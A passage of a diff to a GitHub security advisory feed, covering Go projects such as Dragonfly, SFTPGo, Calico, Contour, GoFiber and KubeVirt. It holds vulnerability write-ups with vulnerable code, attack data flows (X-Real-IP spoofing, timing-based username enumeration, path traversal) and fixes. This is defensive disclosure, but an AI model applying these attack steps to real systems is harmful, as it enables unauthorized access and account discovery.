+-    oa.DELETE(":id", jwt.MiddlewareFunc(), rbac, h.DestroyOauth)
+-    oa.PATCH(":id",  jwt.MiddlewareFunc(), rbac, h.UpdateOauth)
+-    oa.GET(":id", h.GetOauth)
+-    oa.GET("",    h.GetOauths)
++    oa := apiv1.Group("/oauth", jwt.MiddlewareFunc(), rbac)
++    oa.POST("",      h.CreateOauth)
++    oa.DELETE(":id", h.DestroyOauth)
++    oa.PATCH(":id",  h.UpdateOauth)
++    oa.GET(":id",    h.GetOauth)
++    oa.GET("",       h.GetOauths)
+</code></pre>
+<pre><code class="language-diff">--- a/manager/models/oauth.go
++++ b/manager/models/oauth.go
+@@ type Oauth struct {
+-    ClientSecret string `gorm:"column:client_secret;type:varchar(1024);not null;comment:client secret for oauth2" json:"client_secret"`
++    ClientSecret string `gorm:"column:client_secret;type:varchar(1024);not null;comment:client secret for oauth2" json:"-"`
+</code></pre>
+<p>The first hunk mirrors exactly the shape applied for <code>/clusters</code>, <code>/scheduler-clusters</code>, <code>/seed-peer-clusters</code>, <code>/seed-peers</code>, <code>/peers</code>, <code>/configs</code>, <code>/applications</code>, <code>/personal-access-tokens</code>, <code>/persistent-cache-tasks</code>, <code>/audits</code>, and (post-GHSA-j8hf-cp34-g4j7) <code>/jobs</code>. The second hunk adds a defense-in-depth pin so that if the OAuth registration handler is ever consumed by a future routing change, the secret stays out of the JSON contract.</p>
+<h3 id="fix-pr">Fix PR</h3>
+<p><a href="https://github.com/dragonflyoss/dragonfly-ghsa-4q9j-6299-gxmr/pull/1">https://github.com/dragonflyoss/dragonfly-ghsa-4q9j-6299-gxmr/pull/1</a> (temp private fork PR opened on the advisory's embargo-private fork).</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>The OAuth sign-in feature is <code>not actually used in practice within the Dragonfly project itself</code>.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-4q9j-6299-gxmr">https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-4q9j-6299-gxmr</a></li>
+<li><a href="https://github.com/advisories/GHSA-4q9j-6299-gxmr">https://github.com/advisories/GHSA-4q9j-6299-gxmr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4q9j-6299-gxmr</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-02T19:21:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/drakkan/sftpgo/v2] SFTPGo has stored XSS via inline parameter on public shares and user file download]]></title>
+        <id>https://github.com/advisories/GHSA-3vcg-pv95-pq54</id>
+        <link href="https://github.com/advisories/GHSA-3vcg-pv95-pq54"/>
+        <updated>2026-07-02T19:10:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The inline query parameter on the browsable-share file download and on the authenticated user file download suppressed Content-Disposition: attachment, so an HTML file stored in a share or home directory could be served as text/html and execute in SFTPGo's web origin (stored XSS).</p>
+<h2 id="impact">Impact</h2>
+<p>Low. Exploitation requires the attacker to place the file and a victim to open the crafted link — a URL the WebClient never generates, so it requires social engineering — and the practical conditions are narrow:</p>
+<ul>
+<li>Session cookies are HttpOnly, so the cookie cannot be read by the injected script.</li>
+<li>Authenticated shares set their own session cookie, which overwrites the victim's WebClient cookie, no account pivot. The realistic case is a public share, or a folder shared between distinct users combined with targeted social engineering.</li>
+</ul>
+<p>It is a genuine trust-boundary violation (SFTPGo emits attacker-controlled content as active HTML in its own origin), hence an advisory, but the constrained preconditions and the HttpOnly mitigation keep it Low.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to v2.7.3. These endpoints now always respond with Content-Disposition: attachment; the inline parameter has been removed. See the fix commit for the full technical rationale.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/drakkan/sftpgo/security/advisories/GHSA-3vcg-pv95-pq54">https://github.com/drakkan/sftpgo/security/advisories/GHSA-3vcg-pv95-pq54</a></li>
+<li><a href="https://github.com/advisories/GHSA-3vcg-pv95-pq54">https://github.com/advisories/GHSA-3vcg-pv95-pq54</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3vcg-pv95-pq54</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-02T19:09:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/drakkan/sftpgo/v2] SFTPGo has path confinement bypass in public browsable share partial ZIP download]]></title>
+        <id>https://github.com/advisories/GHSA-h64p-8h4r-6gfh</id>
+        <link href="https://github.com/advisories/GHSA-h64p-8h4r-6gfh"/>
+        <updated>2026-07-02T19:10:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The public web-client endpoint for partial ZIP downloads of a browsable share did not correctly confine the client-supplied files entries to the shared directory. A requester able to reach a public share could read files located outside the shared directory, as long as the target's canonical path begins with the shared directory's name.</p>
+<h2 id="patches">Patches</h2>
+<p>Fixed in v2.7.3. The fix replaces the raw prefix check with a directory-boundary–aware check.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/drakkan/sftpgo/security/advisories/GHSA-h64p-8h4r-6gfh">https://github.com/drakkan/sftpgo/security/advisories/GHSA-h64p-8h4r-6gfh</a></li>
+<li><a href="https://github.com/advisories/GHSA-h64p-8h4r-6gfh">https://github.com/advisories/GHSA-h64p-8h4r-6gfh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h64p-8h4r-6gfh</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-02T19:09:13.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor SAML callback handler accepts any well-formed SAMLResponse sent to /api/acs without verifying that it corresponds to an AuthnRequest]]></title>
         <id>https://github.com/advisories/GHSA-mfvp-7p3v-x9mh</id>
@@ -566,331 +1105,5 @@ client = &amp;http.Client{CheckRedirect: checkRedirect}
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-02T17:33:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcalico/calico] Calico Inserts Sensitive Information into Log File]]></title>
-        <id>https://github.com/advisories/GHSA-m67g-87rx-v42c</id>
-        <link href="https://github.com/advisories/GHSA-m67g-87rx-v42c"/>
-        <updated>2026-07-02T17:30:21.000Z</updated>
-        <content type="html"><![CDATA[<p>When Calico is configured with the Azure IPAM plugin, the Calico CNI binary mutates the incoming CNI configuration to attach subnet information before delegating to the IPAM plugin. After mutating, the Azure IPAM helper logs the entire unmarshaled configuration map (stdinData) at INFO level to /var/log/calico/cni/cni.log on every CNI ADD and DEL invocation — once per pod scheduled or terminated on the node. When the cluster is deployed using token-based Kubernetes authentication, this log entry contains the ServiceAccount token, client key, and certificate authority in plaintext. Any principal with read access to /var/log/calico/cni/cni.log on a node&nbsp; can read these logs and extract the credentials, which grant cluster-wide Calico networking admin privileges.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41185">https://nvd.nist.gov/vuln/detail/CVE-2026-41185</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12502">https://github.com/projectcalico/calico/pull/12502</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12526">https://github.com/projectcalico/calico/pull/12526</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12527">https://github.com/projectcalico/calico/pull/12527</a></li>
-<li><a href="https://www.tigera.io/security-bulletins/tta-2026-002">https://www.tigera.io/security-bulletins/tta-2026-002</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271">https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0">https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812">https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812</a></li>
-<li><a href="https://github.com/advisories/GHSA-m67g-87rx-v42c">https://github.com/advisories/GHSA-m67g-87rx-v42c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m67g-87rx-v42c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-28T18:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcalico/calico] Calico Inserts Sensitive Information into Log File]]></title>
-        <id>https://github.com/advisories/GHSA-m67g-87rx-v42c</id>
-        <link href="https://github.com/advisories/GHSA-m67g-87rx-v42c"/>
-        <updated>2026-07-02T17:30:21.000Z</updated>
-        <content type="html"><![CDATA[<p>When Calico is configured with the Azure IPAM plugin, the Calico CNI binary mutates the incoming CNI configuration to attach subnet information before delegating to the IPAM plugin. After mutating, the Azure IPAM helper logs the entire unmarshaled configuration map (stdinData) at INFO level to /var/log/calico/cni/cni.log on every CNI ADD and DEL invocation — once per pod scheduled or terminated on the node. When the cluster is deployed using token-based Kubernetes authentication, this log entry contains the ServiceAccount token, client key, and certificate authority in plaintext. Any principal with read access to /var/log/calico/cni/cni.log on a node&nbsp; can read these logs and extract the credentials, which grant cluster-wide Calico networking admin privileges.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41185">https://nvd.nist.gov/vuln/detail/CVE-2026-41185</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12502">https://github.com/projectcalico/calico/pull/12502</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12526">https://github.com/projectcalico/calico/pull/12526</a></li>
-<li><a href="https://github.com/projectcalico/calico/pull/12527">https://github.com/projectcalico/calico/pull/12527</a></li>
-<li><a href="https://www.tigera.io/security-bulletins/tta-2026-002">https://www.tigera.io/security-bulletins/tta-2026-002</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271">https://github.com/projectcalico/calico/commit/0ca653db0ae7400ea9fb066daa7f45c902482271</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0">https://github.com/projectcalico/calico/commit/cd73bc2cea0f4989772f2deb93909e7cfac927e0</a></li>
-<li><a href="https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812">https://github.com/projectcalico/calico/commit/da9ea3a13927a35e4022b787d17a005b2157d812</a></li>
-<li><a href="https://github.com/advisories/GHSA-m67g-87rx-v42c">https://github.com/advisories/GHSA-m67g-87rx-v42c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m67g-87rx-v42c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-28T18:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcontour/contour] Contour has Improper JWT Verification for Non-SNI Requests on Virtual Hosts with Fallback Certificate Enabled]]></title>
-        <id>https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</id>
-        <link href="https://github.com/advisories/GHSA-g3xr-5w5j-w4q4"/>
-        <updated>2026-07-02T17:15:23.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>When an <code>HTTPProxy</code> is configured with incompatible combination of both <code>.spec.virtualhost.tls.enableFallbackCertificate: true</code> and <code>.spec.virtualhost.jwtProviders</code>, Contour does not reject the configuration. Consequently, requests from clients that do not send TLS SNI or send an unrecognized SNI (one that does not match any <code>HTTPProxy</code> FQDN) bypass configured JWT verification and are proxied to upstream services without a valid token.</p>
-<p>To list all <code>HTTPProxies</code> with this invalid configuration, run</p>
-<pre><code class="language-bash">kubectl get httpproxies -A -o json | jq -r '
-  .items[]
-  | select(.spec.virtualhost | .tls.enableFallbackCertificate and .jwtProviders)
-  | "Invalid HTTPProxy found: \(.metadata.namespace)/\(.metadata.name)"
-'
-</code></pre>
-<h3 id="patches">Patches</h3>
-<p>This issue is fixed in Contour v1.33.5. Contour now rejects and marks invalid any <code>HTTPProxy</code> resources that combine <code>.spec.virtualhost.tls.enableFallbackCertificate: true</code> with <code>.spec.virtualhost.jwtProviders</code>. Affected resources will receive a status  condition with the error reason <code>TLSIncompatibleFeatures</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not enable <code>.spec.virtualhost.tls.enableFallbackCertificate</code> on <code>HTTPProxy</code> resources that also define <code>.spec.virtualhost.jwtProviders</code>. Remove one of the two settings to avoid the invalid configuration.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Contour fallback certificate documentation: <a href="https://projectcontour.io/docs/main/config/tls-termination/#fallback-certificate">https://projectcontour.io/docs/main/config/tls-termination/#fallback-certificate</a></li>
-<li>Contour JWT verification documentation: <a href="https://projectcontour.io/docs/main/config/jwt-verification/">https://projectcontour.io/docs/main/config/jwt-verification/</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/projectcontour/contour/security/advisories/GHSA-g3xr-5w5j-w4q4">https://github.com/projectcontour/contour/security/advisories/GHSA-g3xr-5w5j-w4q4</a></li>
-<li><a href="https://github.com/advisories/GHSA-g3xr-5w5j-w4q4">https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g3xr-5w5j-w4q4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-02T17:15:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] GoFiber Vulnerable to X-Real-IP Spoofing via Header.Add() in BalancerForward]]></title>
-        <id>https://github.com/advisories/GHSA-gcfq-8gqf-4876</id>
-        <link href="https://github.com/advisories/GHSA-gcfq-8gqf-4876"/>
-        <updated>2026-07-02T13:50:46.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>BalancerForward</code> proxy helper in GoFiber uses <code>Header.Add()</code> instead of <code>Header.Set()</code> when injecting the <code>X-Real-IP</code> header. This appends the real client IP as a second header value rather than replacing any attacker-supplied value. Upstream servers that read the first <code>X-Real-IP</code> header (nginx, Express, most HTTP servers) use the attacker's spoofed IP for logging, rate limiting, and access control.</p>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p><strong>File:</strong> <code>middleware/proxy/proxy.go</code>, lines 270-285</p>
-<pre><code class="language-go">func BalancerForward(servers []string, clients ...*fasthttp.Client) fiber.Handler {
-    r := &amp;roundrobin{
-        current: 0,
-        pool:    servers,
-    }
-    return func(c fiber.Ctx) error {
-        server := r.get()
-        if !strings.HasPrefix(server, "http") {
-            server = "http://" + server
-        }
-        c.Request().Header.Add("X-Real-IP", c.IP())   // line 282: Add, not Set
-        return Do(c, server+c.OriginalURL(), clients...)
-    }
-}
-</code></pre>
-<h2 id="data-flow">Data Flow</h2>
-<ol>
-<li>Attacker sends request with <code>X-Real-IP: 10.0.0.1</code> (spoofed internal IP)</li>
-<li><code>BalancerForward</code> handler executes at line 282</li>
-<li><code>c.Request().Header.Add("X-Real-IP", c.IP())</code> APPENDS the real IP as a second header</li>
-<li>Upstream server receives: <code>X-Real-IP: 10.0.0.1</code> AND <code>X-Real-IP: &lt;real-attacker-ip&gt;</code></li>
-<li>Most HTTP servers (nginx, Node.js, Apache) read the FIRST value</li>
-<li>Upstream uses <code>10.0.0.1</code> for all IP-dependent logic</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Rate limit bypass:</strong> IP-based rate limiting at the upstream uses the spoofed IP, allowing unlimited requests</li>
-<li><strong>IP ACL bypass:</strong> Internal IP allowlists (e.g., admin panels restricted to <code>10.0.0.0/8</code>) can be bypassed</li>
-<li><strong>Audit log poisoning:</strong> Security logs record the spoofed IP, making incident investigation unreliable</li>
-<li><strong>Geolocation bypass:</strong> IP-based geofencing or region restrictions are circumvented</li>
-</ul>
-<h2 id="fix">Fix</h2>
-<p>Replace <code>Header.Add()</code> with <code>Header.Set()</code> at line 282:</p>
-<pre><code class="language-go">c.Request().Header.Set("X-Real-IP", c.IP())
-</code></pre>
-<p><code>Header.Set()</code> replaces any existing header value, ensuring only the real client IP is forwarded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876">https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876</a></li>
-<li><a href="https://github.com/advisories/GHSA-gcfq-8gqf-4876">https://github.com/advisories/GHSA-gcfq-8gqf-4876</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gcfq-8gqf-4876</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-02T13:50:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] GoFiber Vulnerable to X-Real-IP Spoofing via Header.Add() in BalancerForward]]></title>
-        <id>https://github.com/advisories/GHSA-gcfq-8gqf-4876</id>
-        <link href="https://github.com/advisories/GHSA-gcfq-8gqf-4876"/>
-        <updated>2026-07-02T13:50:46.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>BalancerForward</code> proxy helper in GoFiber uses <code>Header.Add()</code> instead of <code>Header.Set()</code> when injecting the <code>X-Real-IP</code> header. This appends the real client IP as a second header value rather than replacing any attacker-supplied value. Upstream servers that read the first <code>X-Real-IP</code> header (nginx, Express, most HTTP servers) use the attacker's spoofed IP for logging, rate limiting, and access control.</p>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p><strong>File:</strong> <code>middleware/proxy/proxy.go</code>, lines 270-285</p>
-<pre><code class="language-go">func BalancerForward(servers []string, clients ...*fasthttp.Client) fiber.Handler {
-    r := &amp;roundrobin{
-        current: 0,
-        pool:    servers,
-    }
-    return func(c fiber.Ctx) error {
-        server := r.get()
-        if !strings.HasPrefix(server, "http") {
-            server = "http://" + server
-        }
-        c.Request().Header.Add("X-Real-IP", c.IP())   // line 282: Add, not Set
-        return Do(c, server+c.OriginalURL(), clients...)
-    }
-}
-</code></pre>
-<h2 id="data-flow">Data Flow</h2>
-<ol>
-<li>Attacker sends request with <code>X-Real-IP: 10.0.0.1</code> (spoofed internal IP)</li>
-<li><code>BalancerForward</code> handler executes at line 282</li>
-<li><code>c.Request().Header.Add("X-Real-IP", c.IP())</code> APPENDS the real IP as a second header</li>
-<li>Upstream server receives: <code>X-Real-IP: 10.0.0.1</code> AND <code>X-Real-IP: &lt;real-attacker-ip&gt;</code></li>
-<li>Most HTTP servers (nginx, Node.js, Apache) read the FIRST value</li>
-<li>Upstream uses <code>10.0.0.1</code> for all IP-dependent logic</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Rate limit bypass:</strong> IP-based rate limiting at the upstream uses the spoofed IP, allowing unlimited requests</li>
-<li><strong>IP ACL bypass:</strong> Internal IP allowlists (e.g., admin panels restricted to <code>10.0.0.0/8</code>) can be bypassed</li>
-<li><strong>Audit log poisoning:</strong> Security logs record the spoofed IP, making incident investigation unreliable</li>
-<li><strong>Geolocation bypass:</strong> IP-based geofencing or region restrictions are circumvented</li>
-</ul>
-<h2 id="fix">Fix</h2>
-<p>Replace <code>Header.Add()</code> with <code>Header.Set()</code> at line 282:</p>
-<pre><code class="language-go">c.Request().Header.Set("X-Real-IP", c.IP())
-</code></pre>
-<p><code>Header.Set()</code> replaces any existing header value, ensuring only the real client IP is forwarded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876">https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876</a></li>
-<li><a href="https://github.com/advisories/GHSA-gcfq-8gqf-4876">https://github.com/advisories/GHSA-gcfq-8gqf-4876</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gcfq-8gqf-4876</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-02T13:50:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] GoFiber Vulnerable to Username Enumeration via Timing Oracle in BasicAuth Default Authorizer]]></title>
-        <id>https://github.com/advisories/GHSA-g5vh-55hw-rxm8</id>
-        <link href="https://github.com/advisories/GHSA-g5vh-55hw-rxm8"/>
-        <updated>2026-07-02T13:46:27.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The default <code>Authorizer</code> function in GoFiber's BasicAuth middleware uses short-circuit evaluation that skips password hash comparison for non-existent usernames. With bcrypt-hashed passwords (the primary use case), the timing difference between a valid and invalid username is approximately 1,000,000:1 (~100ms vs ~100ns), enabling reliable remote username enumeration.</p>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p><strong>File:</strong> <code>middleware/basicauth/config.go</code>, lines 126-138</p>
-<pre><code class="language-go">if cfg.Authorizer == nil {
-    verifiers := make(map[string]func(string) bool, len(cfg.Users))
-    for u, hpw := range cfg.Users {
-        v, err := parseHashedPassword(hpw)
-        if err != nil {
-            panic(err)
-        }
-        verifiers[u] = v
-    }
-    cfg.Authorizer = func(user, pass string, _ fiber.Ctx) bool {
-        verify, ok := verifiers[user]
-        return ok &amp;&amp; verify(pass)   // line 137: short-circuit skips verify() if user unknown
-    }
-}
-</code></pre>
-<h2 id="data-flow">Data Flow</h2>
-<ol>
-<li>Attacker sends <code>Authorization: Basic &lt;base64(candidate:wrongpass)&gt;</code></li>
-<li>BasicAuth middleware decodes credentials and calls <code>cfg.Authorizer(user, pass, c)</code></li>
-<li>Map lookup <code>verifiers[user]</code> returns <code>ok=false</code> for non-existent users</li>
-<li>Go <code>&amp;&amp;</code> short-circuit: <code>false &amp;&amp; verify(pass)</code> returns immediately without calling <code>verify()</code></li>
-<li>For valid users, <code>verify(pass)</code> executes <code>bcrypt.CompareHashAndPassword()</code> (line 167: ~100ms at default cost 10)</li>
-<li>Timing difference: ~100ns (invalid user) vs ~100ms (valid user) = 1,000,000:1 ratio</li>
-</ol>
-<p><strong>Timing comparison by hash type:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Hash Type</th>
-<th>Valid User</th>
-<th>Invalid User</th>
-<th>Ratio</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>bcrypt ($2)</td>
-<td>~100 ms</td>
-<td>~100 ns</td>
-<td>1,000,000:1</td>
-</tr>
-<tr>
-<td>SHA-512</td>
-<td>~1-5 us</td>
-<td>~100 ns</td>
-<td>10-50:1</td>
-</tr>
-<tr>
-<td>SHA-256</td>
-<td>~1-5 us</td>
-<td>~100 ns</td>
-<td>10-50:1</td>
-</tr>
-</tbody></table>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Username enumeration:</strong> Attacker reliably determines which usernames exist by measuring response latency</li>
-<li><strong>Targeted brute force:</strong> After enumerating valid usernames, password brute force is focused only on real accounts</li>
-<li><strong>Account discovery:</strong> In applications where usernames are sensitive (internal tools, admin panels), leaking their existence is itself a security issue</li>
-</ul>
-<h2 id="notes">Notes</h2>
-<ul>
-<li>Password hash comparisons themselves are timing-safe: <code>subtle.ConstantTimeCompare</code> is used correctly for SHA-256 (line 185), SHA-512 (line 176), and bcrypt uses its own constant-time comparison</li>
-<li>The fix is to always execute a dummy hash comparison for unknown users: <code>bcrypt.CompareHashAndPassword(dummyHash, []byte(pass))</code> and discard the result</li>
-<li>This pattern matches CVE-2023-36456 (Authentik timing oracle) and similar findings in other auth libraries</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-g5vh-55hw-rxm8">https://github.com/gofiber/fiber/security/advisories/GHSA-g5vh-55hw-rxm8</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5vh-55hw-rxm8">https://github.com/advisories/GHSA-g5vh-55hw-rxm8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5vh-55hw-rxm8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-02T13:46:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[kubevirt.io/kubevirt] KubeVirt has a Link Following issue]]></title>
-        <id>https://github.com/advisories/GHSA-mpmf-3w4r-qfpf</id>
-        <link href="https://github.com/advisories/GHSA-mpmf-3w4r-qfpf"/>
-        <updated>2026-07-01T22:01:19.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in KubeVirt's virt-exportserver component. An attacker with specific namespace-level access can exploit a path traversal vulnerability in the VMExport directory endpoint. By placing a symbolic link (symlink) within an exported filesystem Persistent Volume Claim (PVC) that points outside its designated mount root, the attacker can read arbitrary files from the exporter pod's filesystem. This leads to information disclosure, potentially exposing sensitive data.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9804">https://nvd.nist.gov/vuln/detail/CVE-2026-9804</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-9804">https://access.redhat.com/security/cve/CVE-2026-9804</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482487">https://bugzilla.redhat.com/show_bug.cgi?id=2482487</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:27914">https://access.redhat.com/errata/RHSA-2026:27914</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:27983">https://access.redhat.com/errata/RHSA-2026:27983</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:28002">https://access.redhat.com/errata/RHSA-2026:28002</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:27903">https://access.redhat.com/errata/RHSA-2026:27903</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:27913">https://access.redhat.com/errata/RHSA-2026:27913</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-9804.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-9804.json</a></li>
-<li><a href="https://github.com/kubevirt/kubevirt/commit/6ea563fa94d8ca803f8dd9394cefd8cae36bb0ee">https://github.com/kubevirt/kubevirt/commit/6ea563fa94d8ca803f8dd9394cefd8cae36bb0ee</a></li>
-<li><a href="https://github.com/advisories/GHSA-mpmf-3w4r-qfpf">https://github.com/advisories/GHSA-mpmf-3w4r-qfpf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mpmf-3w4r-qfpf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-28T09:31:20.000Z</published>
     </entry>
 </feed>
